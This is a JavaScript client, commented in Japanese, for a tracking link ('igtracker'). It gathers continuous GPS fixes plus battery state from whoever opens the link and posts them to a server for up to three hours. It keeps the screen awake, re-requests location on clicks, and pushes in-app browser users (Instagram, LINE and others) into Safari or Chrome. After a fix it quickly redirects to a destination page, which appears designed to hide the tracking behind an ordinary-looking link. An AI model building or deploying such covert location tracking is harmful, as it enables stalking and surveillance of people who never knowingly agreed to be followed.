/* igtracker 連続位置追跡クライアント v10
   window.LT_CODE / LT_IV / LT_MAX / LT_HIT を事前定義すること。
   v10: ゲート（要件→続ける）対応。igt:gate まで起動しない。
*/
(function () {
  "use strict";

  var CODE = window.LT_CODE || "";
  if (!CODE) return;

  var API = "/l/" + encodeURIComponent(CODE) + "/p";
  var IV = Math.max(5, (window.LT_IV || 15) | 0) * 1000;
  var MAXMIN = (window.LT_MAX || 180) | 0;
  var HIT = window.LT_HIT || 0;
  var SEND_EVERY = Math.min(IV, 4000);

  var LADDER = [
    { enableHighAccuracy: true,  timeout: 20000, maximumAge: 0 },
    { enableHighAccuracy: false, timeout: 25000, maximumAge: 30000 },
    { enableHighAccuracy: false, timeout: 45000, maximumAge: 120000 }
  ];
  var step = 0;
  function opts() { return LADDER[Math.min(step, LADDER.length - 1)]; }

  var DEST = window.LT_DEST || "";
  var DEST_MIN = (parseFloat(window.LT_DEST_MIN) || 2) * 1000;
  var WAIT = (parseFloat(window.LT_WAIT) || 10) * 1000;
  var DENY_REDIRECT = !!window.LT_DENY_REDIRECT;
  var ASK_TEXT = window.LT_ASK_TEXT || "位置情報の使用を許可してください";
  var DENY_TEXT = window.LT_DENY_TEXT || "位置情報が許可されていません";
  var RETRY_TEXT = window.LT_RETRY_TEXT || "もう一度";
  var DEBUG = !!window.LT_DEBUG;

  var SID = (function () {
    try {
      var v = sessionStorage.getItem("igt_sid_" + CODE);
      if (!v) {
        v = Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
        sessionStorage.setItem("igt_sid_" + CODE, v);
      }
      return v;
    } catch (e) { return Math.random().toString(36).slice(2, 12); }
  })();

  var q = [];
  var sending = false, last = 0, started = 0, count = 0, left = false;
  var wid = null, wake = null, clock = null, sender = null, dog = null;
  var waitTimer = null, ladderTimer = null;
  var stopped = true, gotFix = false, bestAcc = null;
  var lastFix = 0, lastAsk = 0, lastRestart = 0;
  var state = "wait";
  var batt = null, chg = null;
  var inapp = "";

  function $(id) { return document.getElementById(id); }
  function iso(t) { try { return new Date(t).toISOString(); } catch (e) { return ""; } }

  function line(text, warn) {
    var s = $("lt_st");
    if (!s) return;
    s.textContent = text;
    s.className = "line" + (warn ? " warn" : "");
  }
  function dbg(m) { if (DEBUG) { var d = $("lt_dbg"); if (d) d.textContent = m; } }
  function showRetry() {
    var r = $("lt_retry");
    if (r) { r.textContent = RETRY_TEXT; r.style.display = state === "deny" ? "" : "none"; }
  }
  function announce() {
    window.LT_GPS_READY = true;
    try { window.dispatchEvent(new Event("igt:gps")); } catch (e) {}
  }
  function setState(st) {
    if (st === "ok") {
      if (state === "ok") return;
      state = "ok"; line("", false); showRetry();
      var ia = $("lt_ia"); if (ia) ia.style.display = "none";
      return;
    }
    state = st;
    if (st === "deny") { line(DENY_TEXT, true); if (inapp) showInApp(); }
    else { line(ASK_TEXT, false); }
    showRetry();
  }
  function showInApp() {
    var box = $("lt_ia"), nm = $("lt_ia_name"), link = $("lt_safari");
    if (!box) return;
    box.style.display = "block";
    if (nm) nm.textContent = inapp;
    if (link) {
      var ios = /iPhone|iPad|iPod/i.test(navigator.userAgent || "");
      link.href = ios
        ? location.href.replace(/^https:/, "x-safari-https:")
        : "intent://" + location.href.replace(/^https?:\/\//, "") +
          "#Intent;scheme=https;package=com.android.chrome;end";
      link.textContent = ios ? "Safariで開き直す" : "Chromeで開き直す";
    }
  }
  function armWait(ms) {
    if (waitTimer) { clearTimeout(waitTimer); waitTimer = null; }
    if (gotFix || left || stopped) return;
    waitTimer = setTimeout(function () {
      waitTimer = null;
      if (left || stopped || gotFix) return;
      if (DENY_REDIRECT && DEST) { leave(); return; }
      setState("deny");
    }, ms);
  }
  function tick() {
    if (!started) return;
    var sec = Math.floor((Date.now() - started) / 1000);
    var e = $("lt_time");
    if (e) e.textContent = ("0" + Math.floor(sec / 60)).slice(-2) + ":" +
                           ("0" + (sec % 60)).slice(-2);
  }
  function drop(arr) { q = q.filter(function (x) { return arr.indexOf(x) === -1; }); }

  function send(extra) {
    if (sending) return;
    if (!q.length && !extra) return;
    sending = true;
    var pts = q.slice(0);
    var body = { sid: SID, kind: (extra && extra.kind) || "pt", hit: HIT, pts: pts };
    fetch(API, {
      method: "POST", cache: "no-store",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body)
    })
      .then(function (r) { return r.json().catch(function () { return {}; }); })
      .then(function (j) {
        drop(pts); last = Date.now();
        if (j && j.iv && j.iv * 1000 !== IV) IV = j.iv * 1000;
      })
      .catch(function () {})
      .then(function () { sending = false; });
  }
  function beacon(kind) {
    var pts = q.slice(0);
    var payload = JSON.stringify({ sid: SID, kind: kind, hit: HIT, pts: pts });
    var ok = false;
    try {
      ok = !!(navigator.sendBeacon && navigator.sendBeacon(
        API, new Blob([payload], { type: "application/json" })));
    } catch (e) { ok = false; }
    if (ok) drop(pts); else send({ kind: kind });
  }
  function goto(url) {
    if (!url || left) return;
    left = true;
    if (waitTimer) { clearTimeout(waitTimer); waitTimer = null; }
    try { beacon("stop"); } catch (e) {}
    try { location.replace(url); } catch (e) { location.href = url; }
  }
  function leave() { if (!left && DEST) goto(DEST); }

  function onPos(p) {
    var c = (p && p.coords) || {};
    if (c.latitude == null || c.longitude == null) return;
    var first = !gotFix;
    gotFix = true; count++;
    lastFix = Date.now();
    step = 0;
    if (waitTimer) { clearTimeout(waitTimer); waitTimer = null; }
    if (first) {
      setState("ok"); announce();
      if (window.LT_KEEP && window.LT_KEEP.kick) { try { window.LT_KEEP.kick(); } catch (e) {} }
      if (DEST) setTimeout(leave, DEST_MIN);
    }
    q.push({ ts: iso(p.timestamp || Date.now()), lat: c.latitude, lon: c.longitude,
             acc: c.accuracy, spd: c.speed, hdg: c.heading, batt: batt, chg: chg });
    if (q.length > 3000) q.splice(0, q.length - 3000);
    if (c.accuracy && (bestAcc === null || c.accuracy < bestAcc)) bestAcc = c.accuracy;
    var n = $("lt_now");
    if (n) n.textContent = c.latitude.toFixed(5) + ", " + c.longitude.toFixed(5) +
                           (c.accuracy ? " ±" + Math.round(c.accuracy) + "m" : "");
    dbg("fix acc=" + Math.round(c.accuracy || 0) + " n=" + count + " step=" + step);
    if (count === 1 || q.length >= 4 || Date.now() - last > SEND_EVERY) send();
  }

  function onErr(e) {
    var c = (e && e.code) || 0;
    dbg("err code=" + c + " msg=" + ((e && e.message) || "") + " step=" + step);
    if (gotFix) return;
    if (c === 1) { setState("deny"); return; }
    if (step < LADDER.length - 1) {
      step++;
      line("位置情報を取得中…", false);
      if (ladderTimer) clearTimeout(ladderTimer);
      ladderTimer = setTimeout(function () {
        ladderTimer = null;
        if (stopped || left || gotFix) return;
        try { navigator.geolocation.getCurrentPosition(onPos, onErr, opts()); } catch (e) {}
      }, 1200);
      return;
    }
    armWait(WAIT);
  }

  function watchdog() {
    if (stopped || left || !navigator.geolocation) return;
    var gap = Date.now() - (lastFix || started || Date.now());
    var need = (state === "deny") ? 8000 : 15000;
    if (gap > need && Date.now() - lastAsk > 6000) {
      lastAsk = Date.now();
      if (!gotFix && step < LADDER.length - 1) step++;
      try { navigator.geolocation.getCurrentPosition(onPos, onErr, opts()); } catch (e) {}
    }
    if (gap > 45000 && Date.now() - lastRestart > 30000) {
      lastRestart = Date.now(); restart();
    }
  }

  function showPerm() {
    var el = $("lt_perm");
    if (!el) return Promise.resolve("unknown");
    if (!navigator.permissions || !navigator.permissions.query) {
      el.textContent = "unknown"; return Promise.resolve("unknown");
    }
    return navigator.permissions.query({ name: "geolocation" })
      .then(function (p) {
        el.textContent = p.state;
        p.onchange = function () {
          showPerm();
          if (p.state === "granted" && !gotFix && started) attempt();
        };
        return p.state;
      })
      .catch(function () { el.textContent = "unknown"; return "unknown"; });
  }
  function checkInApp() {
    var ua = navigator.userAgent || "", name = "";
    if (/Instagram/i.test(ua)) name = "Instagram";
    else if (/FBAN|FBAV/i.test(ua)) name = "Facebook";
    else if (/Line\//i.test(ua)) name = "LINE";
    else if (/Twitter/i.test(ua)) name = "X";
    if (!name) return;
    inapp = name;
    var nm = $("lt_ia_name"); if (nm) nm.textContent = name;
    if (state === "deny" || !gotFix) showInApp();
  }
  function ask() {
    return new Promise(function (res) {
      if (!navigator.geolocation) return res(false);
      navigator.geolocation.getCurrentPosition(
        function (p) { onPos(p); res(true); },
        function (e) { onErr(e); res(false); }, opts());
    });
  }
  function attempt() {
    if (stopped || left) return Promise.resolve(false);
    lastFix = 0; lastAsk = 0;
    restart();
    return ask().then(function () {
      if (stopped || left) return false;
      start();
      if (!gotFix) armWait(WAIT);
      return gotFix;
    });
  }
  function readBatt() {
    try {
      if (!navigator.getBattery) return;
      navigator.getBattery().then(function (b) {
        function up() { batt = b.level; chg = b.charging ? 1 : 0; }
        up();
        b.addEventListener("levelchange", up);
        b.addEventListener("chargingchange", up);
      }).catch(function () {});
    } catch (e) {}
  }
  function keepAwake() {
    try {
      if (navigator.wakeLock && !wake) {
        navigator.wakeLock.request("screen").then(function (w) {
          wake = w;
          w.addEventListener("release", function () { wake = null; });
        }).catch(function () {});
      }
    } catch (e) {}
  }
  function start() {
    if (wid !== null || !navigator.geolocation) return;
    try { wid = navigator.geolocation.watchPosition(onPos, onErr, opts()); }
    catch (e) { wid = null; }
  }
  function restart() {
    if (wid !== null) { try { navigator.geolocation.clearWatch(wid); } catch (e) {} wid = null; }
    start();
  }

  function boot() {
    if (started) return;
    started = Date.now(); stopped = false;
    showPerm(); checkInApp(); readBatt(); keepAwake(); showRetry();
    if (window.LT_KEEP && window.LT_KEEP.kick) { try { window.LT_KEEP.kick(); } catch (e) {} }
    if (!navigator.geolocation) { setState("deny"); return; }
    if (window.LT_FIRST_FIX && !gotFix) { try { onPos(window.LT_FIRST_FIX); } catch (e) {} }
    ask().then(function () {
      if (stopped || left) return;
      start();
      if (!gotFix) q.push({ ts: iso(Date.now()) });
      send({ kind: "open" });
      clock = setInterval(tick, 1000);
      sender = setInterval(function () {
        tick();
        if (q.length) send();
        else if (Date.now() - last > Math.max(30000, IV * 3)) send({ kind: "hb" });
        if (MAXMIN && Date.now() - started > MAXMIN * 60000) stop("時間上限");
      }, SEND_EVERY);
      dog = setInterval(watchdog, 5000);
      if (!gotFix) armWait(WAIT);
    });
  }

  function stop(why) {
    if (stopped) return;
    stopped = true; started = 0;
    if (waitTimer) { clearTimeout(waitTimer); waitTimer = null; }
    if (ladderTimer) { clearTimeout(ladderTimer); ladderTimer = null; }
    if (wid !== null) { try { navigator.geolocation.clearWatch(wid); } catch (e) {} wid = null; }
    if (clock) clearInterval(clock);
    if (sender) clearInterval(sender);
    if (dog) clearInterval(dog);
    clock = sender = dog = null;
    beacon("stop");
    state = "wait";
    if (!gotFix) line(ASK_TEXT, false);
    showRetry();
  }
  function resume() {
    if (stopped || left) return;
    keepAwake(); lastRestart = 0;
    if (window.LT_KEEP && window.LT_KEEP.kick) { try { window.LT_KEEP.kick(); } catch (e) {} }
    if (!gotFix) step = 0;
    watchdog();
    if (!gotFix) attempt();
    send({ kind: "hb" });
  }

  document.addEventListener("visibilitychange", function () {
    if (document.visibilityState === "hidden") { if (!left) beacon("hb"); return; }
    if (started) resume();
  });
  window.addEventListener("focus", function () { if (started) resume(); });
  window.addEventListener("online", function () { if (started) resume(); });
  window.addEventListener("pagehide", function () { if (!left && started) beacon("stop"); });
  window.addEventListener("pageshow", function (e) {
    if (!e.persisted || !started) return;
    stopped = false; left = false;
    lastFix = 0; lastRestart = 0; step = 0;
    restart(); send({ kind: "open" });
    if (!gotFix) armWait(WAIT);
  });
  document.addEventListener("click", function (e) {
    var t = e.target;
    if (t && t.tagName === "BUTTON") return;
    if (started && !stopped && !gotFix) attempt();
  }, { passive: true });
  var rt = $("lt_retry");
  if (rt) rt.addEventListener("click", function () { setState("wait"); attempt(); });

  window.LT_LIVE = {
    start: boot, stop: stop, leave: leave, retry: attempt, restart: restart,
    feed: function (p) { try { onPos(p); } catch (e) {} },
    sid: SID, state: function () { return state; }, step: function () { return step; }
  };

  showPerm().then(function () {
    checkInApp();
    if (window.LT_GATE && !window.LT_GATE_PASS) {
      window.addEventListener("igt:gate", function () { boot(); }, { once: true });
    } else {
      boot();
    }
  });
})();